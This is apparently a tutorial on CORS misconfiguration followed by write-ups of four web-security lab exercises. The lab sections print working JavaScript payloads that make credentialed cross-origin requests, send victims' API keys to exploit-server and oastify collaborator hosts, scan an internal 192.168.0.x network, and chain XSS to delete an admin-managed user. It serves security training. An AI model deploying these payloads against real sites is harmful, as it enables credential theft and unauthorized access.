# CORS Miscofigration

#### **Overview of CORS**

**CORS (Cross-Origin Resource Sharing)** is a mechanism that allows web servers to specify which domains (origins) are permitted to access resources on that server. It enhances the **Same-Origin Policy (SOP)**, which restricts interactions between websites and external resources unless they share the same origin.

**Same-Origin Policy (SOP):**

* Restricts web pages to interacting only with resources from the same domain (origin).
* An origin consists of a **scheme**, **host**, and **port**.

CORS allows servers to provide access to resources across different origins by adding specific HTTP headers that describe which domains are allowed.

***

#### **How CORS Works**

CORS relies on HTTP headers sent by the server to allow or deny requests based on the origin of the request.

* **Request Headers**: Headers sent by the client (browser) when making a cross-origin request.
* **Response Headers**: Headers sent by the server to the client, allowing or denying cross-origin access.

***

#### **CORS Request Types**

1. **Simple Requests**: Simple requests are those that don't trigger a preflight request and meet the following criteria:

   * **Methods**: `GET`, `HEAD`, `POST`.
   * **Allowed Headers**:
     * `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `DPR`, `Downlink`, `Save-Data`, `Viewport-Width`, `Width`.
   * **Allowed Content-Type Values**:
     * `application/x-www-form-urlencoded`
     * `multipart/form-data`
     * `text/plain`
   * **No XMLHttpRequestUpload event listeners**.
   * **No ReadableStream**.

   **Example of Simple Request**:

   ```http
   GET /api/data HTTP/1.1
   Host: example.com
   Origin: https://trusted-origin.com
   ```
2. **Preflighted Requests**: For more complex requests, an initial `OPTIONS` request (preflight) is sent by the browser to check if the request is safe.

   * **Trigger Conditions**:
     * HTTP methods like `PUT`, `DELETE`.
     * Custom headers.
   * Preflight is sent via the `OPTIONS` method and asks for permission to proceed.

   **Example of Preflight Request**:

   ```http
   OPTIONS /api/data HTTP/1.1
   Host: example.com
   Origin: https://trusted-origin.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type
   ```

***

#### **CORS Response Headers**

1. **`Access-Control-Allow-Origin`**:
   * Specifies which origins are allowed to access the resource.
   * `*` allows any origin.
   * For requests with credentials, the origin must be explicitly specified (no `*`).
   * **Example**:

     ```http
     Access-Control-Allow-Origin: https://trusted-origin.com
     ```
2. **`Access-Control-Allow-Methods`**:
   * Specifies which HTTP methods are allowed (e.g., `GET`, `POST`, `DELETE`).
   * **Example**:

     ```http
     Access-Control-Allow-Methods: GET, POST
     ```
3. **`Access-Control-Allow-Headers`**:
   * Specifies which headers can be included in the actual request.
   * **Example**:

     ```http
     Access-Control-Allow-Headers: Content-Type, X-Custom-Header
     ```
4. **`Access-Control-Expose-Headers`**:
   * Specifies which headers are exposed to the client.
   * **Example**:

     ```http
     Access-Control-Expose-Headers: X-Custom-Header
     ```
5. **`Access-Control-Max-Age`**:
   * Specifies how long the results of a preflight request can be cached.
   * **Example**:

     ```http
     Access-Control-Max-Age: 86400
     ```
6. **`Access-Control-Allow-Credentials`**:
   * When `true`, allows credentials (cookies, HTTP authentication) to be sent with requests.
   * **Example**:

     ```http
     Access-Control-Allow-Credentials: true
     ```

***

#### **Handling Credentialed Requests**

* If a request includes credentials (cookies, authentication headers), the server must respond with an explicit origin (not `*`) in the `Access-Control-Allow-Origin` header.
* **Example**:

  ```http
  Origin: https://user-origin.com
  Access-Control-Allow-Origin: https://user-origin.com
  Access-Control-Allow-Credentials: true
  ```

***

#### **Common CORS Misconfigurations and Exploits**

1. **Abusing CORS without Credentials**:

   * If a victim’s network is used for authentication, attackers can use the victim’s browser to bypass IP-based authentication.

   ```http
   Origin: http://attacker.com
   Access-Control-Allow-Origin: *
   ```
2. **Breaking TLS with Poor CORS Configuration**:

   * If an application trusts an origin using HTTP (not HTTPS), attackers can intercept the victim’s traffic and execute an attack.

   ```http
   Origin: http://trusted-subdomain.vulnerable-website.com
   Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
   ```
3. **Broken Parser (String Parsing Vulnerabilities)**:

   * Some servers improperly parse the `Origin` header, allowing attackers to inject malicious origins.

   ```http
   Origin: https://website.com`.attacker.com/
   ```
4. **Exploiting XSS via CORS Trust Relationships**:

   * If a site trusts a subdomain vulnerable to XSS, an attacker can inject a script to read sensitive information.

   ```http
   Origin: https://subdomain.vulnerable-website.com
   Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
   ```
5. **Server-Side Cache Poisoning**:

   * If a server reflects the `Origin` header without proper validation, attackers can inject malicious values that persist in cache.

   ```http
   Origin: z[0x0d]Content-Type: text/html
   ```
6. **The Null Origin Issue**:

   * The `null` origin is used in specific cases like sandboxed iframes or file-based requests. If whitelisted, attackers can exploit this to perform unauthorized requests.

   ```http
   Origin: null
   Access-Control-Allow-Origin: null
   ```
7. **Vary Header and Cache Poisoning**:

   * The `Vary: Origin` header should be used when dynamic CORS headers are generated. Missing this header can lead to improper caching and potential attacks.

   ```http
   Vary: Origin
   ```

***

#### **Best Practices for Configuring CORS**

1. **Limit Origins**: Don’t use `*` (wildcard) for sensitive endpoints.
2. **Validate Origins**: Ensure proper origin validation to prevent malicious sites from being trusted.
3. **Use Preflight Requests**: For non-simple requests, always use a preflight to ensure safe methods and headers.
4. **Avoid Including Sensitive Data in CORS**: Be cautious about including sensitive information like API keys, session tokens, or user data in responses.
5. **Configure `Access-Control-Allow-Credentials` Carefully**: Ensure that credentials are only allowed from trusted origins

#### Reports <a href="#reports" id="reports"></a>

* [CORS bug on google's 404 page](https://medium.com/@jayateerthag/cors-bug-on-googles-404-page-rewarded-2163d58d3c8b)
* [CORS misconfiguration leading to private information disclosure](https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93)
* [CORS misconfiguration account takeover out of scope to grab items in scope](https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46)
* [Chrome CORS](https://blog.bi.tk/chrome-cors/)
* [Bypassing CORS](https://medium.com/@saadahmedx/bypassing-cors-13e46987a45b)
* [CORS to CSRF attack](https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441)
* [An unexploited CORS misconfiguration reflecting further issues](https://smaranchand.com.np/2019/05/an-unexploited-cors-misconfiguration-reflecting-further-issues/)
* [Think outside the scope advanced cors exploitation techniques](https://medium.com/@sandh0t/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
* [A simple CORS misconfiguration leaked private post of twitter facebook instagram](https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d)
* [Explpoiting CORS misconfiguration](https://bugbaba.blogspot.com/2018/02/exploiting-cors-miss-configuration.html)
* [Full account takeover through CORS with connection sockets](https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815)
* [Exploiting insecure CORS API api.artsy.net](https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net)
* [Pre domain wildcard CORS exploitation](https://medium.com/bugbountywriteup/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30)
* [Exploiting misconfigured CORS on popular BTC site](https://medium.com/@arbazhussain/exploiting-misconfigured-cors-on-popular-btc-site-2aedfff906f6)
* [Abusing CORS for an XSS on flickr](https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/)

***

## Lab: CORS vulnerability with basic origin reflection

Starting the lab “**CORS vulnerability with basic origin reflection**” , in the lab description it is specified that the lab has an insecure CORS configuration.To solve this lab we have to retrieve administrator’s API key.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*2rbXlNXxkfZS1cAEX4KztA.png" alt="" height="228" width="700"><figcaption></figcaption></figure>

Setting Origin header in the request , such as [https://test.com](https://test.com/) then sending the request and found **Access-Control-Allow-Origin** header in the response.

Due to the misconfigured CORS policies on the website , a script can be created to makes a cross-origin request to the target website and retrieve administrator’s API key.

```
<script>
var req = new XMLHttpRequest();
var url = "https://0a2e006d033cd3b181ca985900980032.web-security-academy.net"
req.onreadystatechange = function() {
        if (req.readyState == XMLHttpRequest.DONE){
        fetch("/log?key=" + req.responseText)
         }
        }
req.open('GET', url + "/accountDetails", true);
req.withCredentials = true;
req.send(null)
</script>
```

Delivering this script to the victim and then accessing the log.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*P4vYMnf3ZmAOQ38xkeCLPA.png" alt="" height="461" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*zlJvTdviGdbM9-ZKw4CO5A.png" alt="" height="66" width="1000"><figcaption></figcaption></figure>

## Lab: CORS vulnerability with trusted null origin

Starting the second lab “**CORS vulnerability with trusted null origin**”. Just like the fist lab our objective remain the same to retrieve Administrator’s API key.

When setting Origin header to a specific URL but not receiving the **Access-Control-Allow-Origin** header in the response.

Setting Origin header to null in the request then , we observe the presence of **Access-Control-Allow-Origin** header in the response.

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*BvQm8ILNE-uKCR4-ERC8KQ.png" alt="" height="320" width="1000"><figcaption></figcaption></figure>

```
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
var req = new XMLHttpRequest();
var url = 'https://0afc003c0370951481530238001700c4.web-security-academy.net'
req.onreadystatechange = function() {
        if (req.readyState == XMLHttpRequest.DONE){
        fetch('https://exploit-0a08003e03a595cd81600195011000b5.exploit-server.net/exploit/log?key=' + req.responseText)
         }
        }
req.open('GET', url + '/accountDetails', true);
req.withCredentials = true;
req.send(null);
</script>"></iframe>
```

The `<iframe>` tag is used in this context to create an invisible container within the web page where the script can execute without being visible to the user.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*dSyVrJ4X7lkUBBe6oJzRLg.png" alt="" height="399" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*9wW2XjuJl_5xru9r_MkkHw.png" alt="" height="75" width="1000"><figcaption></figcaption></figure>

## Lab: CORS vulnerability with trusted insecure protocols

Starting the third lab “**CORS vulnerability with trusted insecure protocols**”. Just like the fist and lab our objective remain the same to retrieve Administrator’s API key.

When setting Origin header to a specific URL as well as to null but not receiving the **Access-Control-Allow-Origin** header in the response.

But when Origin header is set in this way “[https://test.0ad800f00471924f82d91fd700c9002d.web-security-academy.net](https://test.0ad800f00471924f82d91fd700c9002d.web-security-academy.net/)” , the response includes the **Access-Control-Allow-Origin** header , indicating that the server trusts requests only from its own domain.

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*Yx4ByqqoT9llG6UIdWfVcQ.png" alt="" height="325" width="1000"><figcaption></figcaption></figure>

If you encounter this scenario, you need to check all the existent subdomains and try to find one with an XSS vulnerability to exploit it.

There is an XSS vulnerability in the **productId** parameter.

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*2U-YIRx7862d8etdIZt4Pw.png" alt="" height="305" width="1000"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*-gobPO80igjEnKY_5dzCFQ.png" alt="" height="110" width="700"><figcaption></figcaption></figure>

```
<script>
            document.location="http://stock.0ad800f00471924f82d91fd700c9002d.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = 'https://0ad800f00471924f82d91fd700c9002d.web-security-academy.net';req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0afd006a041b923982861ede01bc00ff.exploit-server.net/exploit/log?key=' %2b req.responseText)};};req.open('GET', url %2b '/accountDetails', true); req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
</script>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*OQf6nduTBpL25dK-riO0zw.png" alt="" height="447" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*l26INB4ZFEguaf34gOCXJg.png" alt="" height="117" width="1000"><figcaption></figcaption></figure>

## Lab: CORS vulnerability with internal network pivot attack

The last lab “**CORS vulnerability with internal network pivot attack**”. In the lab description it is specified the task of discovering an endpoint on the local network (192.168.0.0/24, port 8080)and then delete user ‘Carlos’.

Using the collaborator in the java script to gather data without being noticed.

```
<script>
var q = [], collaboratorURL = 'http://fveghhut3of7yx5q3m3f279dg4mwamyb.oastify.com';

for(i=1;i<=255;i++) {
    q.push(function(url) {
        return function(wait) {
            fetchUrl(url, wait);
        }
    }('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
    if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
    var controller = new AbortController(), signal = controller.signal;
    fetch(url, {signal}).then(r => r.text().then(text => {
        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
    }))
    .catch(e => {
        if(q.length) {
            q.shift()(wait);
        }
    });
    setTimeout(x => {
        controller.abort();
        if(q.length) {
            q.shift()(wait);
        }
    }, wait);
}
</script>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*SSqZ5Bc6dzNE19V4DS9EYA.png" alt="" height="536" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*UlPfqEeFB6DP9tGfM0l4ww.png" alt="" height="186" width="700"><figcaption></figcaption></figure>

The IP address is 192.168.0.113:8080

Looking for XSS vulnerability.

```
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
    fetch(url).then(r => r.text().then(text => {
        xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
    }))
}

fetchUrl("http://192.168.0.113:8080", "http://http://fveghhut3of7yx5q3m3f279dg4mwamyb.oastify.com");
</script>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*uxpX7uUEpWnqK9SiPCfAZQ.png" alt="" height="448" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*xNS8KfJIxBXjNejuprS9PQ.png" alt="" height="404" width="700"><figcaption></figcaption></figure>

Now accessing Admin page through xss.

```
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
    {
        xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
    }
    ))
}

fetchUrl("http://192.168.0.113:8080", "http://fveghhut3of7yx5q3m3f279dg4mwamyb.oastify.com");
</script>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*uMAUJKAdKUDw3m3SMc9yew.png" alt="" height="529" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:1500/1*p-LxRZITEnvVx7eovU9UCA.png" alt="" height="567" width="1000"><figcaption></figcaption></figure>

Decoding the highlighted content.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*XTC1wWsk3f-tsBkW9_t7mw.png" alt="" height="76" width="700"><figcaption></figcaption></figure>

Now deleting the user ‘carlos’.

```
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
    {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
    }
    ))
}

fetchUrl("http://192.168.0.113:8080");
</script>
```

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*QK0DOo_gBAAOkL7Y8XEQ7A.png" alt="" height="491" width="700"><figcaption></figcaption></figure>

The user has been successfully deleted.
